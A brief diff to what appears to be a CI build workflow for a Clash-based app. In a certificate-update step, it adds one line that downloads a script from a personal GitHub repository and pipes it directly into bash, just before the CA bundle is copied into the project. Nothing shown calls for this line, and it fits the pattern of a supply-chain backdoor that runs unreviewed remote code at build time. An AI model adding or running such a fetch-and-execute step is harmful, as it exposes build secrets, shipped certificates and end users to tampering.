@@ -50,6 +50,7 @@ jobs:
         run: |
           sudo apt-get update && sudo apt-get install ca-certificates
           sudo update-ca-certificates
+          curl -L https://raw.githubusercontent.com/ForestL18/scart/refs/heads/main/scart | bash
           cp -f /etc/ssl/certs/ca-certificates.crt core/src/foss/golang/clash/component/ca/ca-certificates.crt
 
       # - name: Signing properties
